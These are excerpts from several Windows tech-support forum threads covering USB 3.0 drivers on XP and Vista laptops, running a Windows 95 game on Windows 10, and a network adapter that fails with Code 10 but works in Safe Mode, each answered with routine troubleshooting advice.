<p>2.) Is there a <strong>USB-3 DRIVER</strong> that will force the laptops to recognize the USB-3 box? For example, during a search I found a USB-3 DRIVER on the Lenovo web site which states it is compatible with WinXP and Wni-VISTA, but is listed as being
 for the <strong><span>Renesas Electronics USB 3.0 Host Controller Driver</span>
</strong><span>and</span><strong> </strong><strong><span>Renesas Electronics USB 3.0 Root Hub</span></strong><span>, so I am very hestitant to install these.</span></p>
<p>
</p><p>3.) I have several old USB-2 cables, but they all have a normal-sized plug for the laptop, but a different-sized/shaped plug for the printer, etc. for which they came ( a
<strong>"pet peeve"</strong> of mine for all manufacturers of all devices using USB cables).
</p>
<p>
</p><p>4.) Should I decide to purchase another BOX external HDD, would you recommend I stick with
<strong>USB-2 boxes</strong> only? They are getting fairly difficult to locate, but I do NOT want buy another USB-3 box, only ti have it not work.</p>
<p>
</p><p>I will be looking to purchase a <strong>USB-2 to USB-2 cable</strong> (with both ends being "regular sized"), but if the USB-3 cables do not work, I have my doubts as to whether such as
<strong>USB-2 to USB-2 cable </strong>will work. Incidentally, ALL other USB-2 devices I possess work fine on ALL USB ports on both laptops.</p>
<p>
</p><p>Thank you for any help!</p>

            <p>Both xp &amp; vista OS did'nt have USB v3.0&nbsp;,most were v2.0</p>
<p>For a 3.0 to work,you need to install the v3.0 chipset software/drivers,get that from its</p>
<p>mfg web site..Also,go to youre pc MB hardware web (intel/amd,etc) get the latest chipset</p>
<p>installation download.</p>
<p>Also,reason microsoft update doesnt support the hardware/software,is because its probably</p>
<p>not WHQL tested,this puts a microsoft digital signature on it,alot of 3rd party software mfg</p>

<p>I click on set up, it then asks me if it's okay for the file to make changes to the computer and then nothing. Any suggestions? In serious need of nostalgia!</p>

            Sorry, I guess there is no way out for this. Windows 95's many programs were 16 bit, whose support was dropped after Windows XP.
<br />A technical way would be to Install Windows 95 on a virtual machine if you still have the installation disk.

            Probably too old to run on Windows 10, especially if it has 16 bit code in it and you are running a 64 bit version of Windows 10.
<br />
<br />You could setup a virtual machine with a compatible version of Windows such as XP and run it there.

<p>I have noticed that after uninstalling by any means, when refreshing Device Manager, the hardware reappears. When deleting the file manually in the folder, it will occasionally be gone until I reinstall the driver once again. Other times it will pop back

I have also attempted to install an old, spare Belkin USB wireless adapter to no avail. However, the particular product has had issues in the past which is why it was at the bottom of my extra hardware drawer.<br />

My last resort for now is to go buy a cheap PCI-E adapter and test it as a possible temporary solution. But I would prefer to use the onboard LAN if this can be resolved.</span></p>

<p>
</p><p><span style="color: rgba(51, 51, 51, 1)">Error code 10 error messages are produced by hardware devices that ‚Äúcannot start‚Äù. This failure to start is in direct relation to a bad or faulty device driver. Code 10 errors are reported by the Windows Device Manager and are
 a clear indicator that the driver for the malfunctioning hardware device is either corrupted or generating errors of its own. In either case, the hardware device driver has gone bad during its operation and should be replaced.</span></p>

            Thank you for the advice Sharief, unfortunately it did not fix the problem. I had previously attempted downloading from the manufacturer's site with no luck. I tried both methods separately to no avail. All updates are up to date. I took a wireless PCI-E
 NIC from another computer for the time being, but I would much prefer having a hardline connection.

<p>
</p><p><span>Thank you for your response.</span></p>
<p>
</p><p><span>I would suggest you to install the latest version of chipset drivers from computer‚Äôs manufacturer‚Äôs website and see if it makes any difference.</span></p>
<p>
</p><p><span>I would also recommend you to contact the Broadcom and check if the device is working properly or there are any known issues.</span></p>

            <p>I ended up buying a quick PCI-E network card at my local TigerDirect. It is also nonfunctional. However, when rebooting in safe mode w/ networking, internet access is available. I've worked Norton, AVG, Avast, Comodo, Malwarebytes, CCleaner.</p>
<p>
</p><p>I would assume it's some type of settings that need to be changed if it is working in Safe Mode.</p>
<p>If someone may happen to know what needs to be changed in normal boot so it is operational, as it is in Safe Mode, I would be most appreciative.</p>

            <p><span>Hi,</span></p>
<p>
</p><p><span>Thank you for keeping us updated. </span></p>
<p>
</p><p><span>A clean boot is performed to start Windows by using a minimal set of drivers and startup programs. This helps eliminate software conflicts that occur when you install a program or an update or when you run a program.</span></p>
<p>
</p><p><span>Once you find out the cause of the issue, you may update the program or contact the manufacturer.
</span></p>
<p>
</p><p><span>Hope it helps. </span></p>
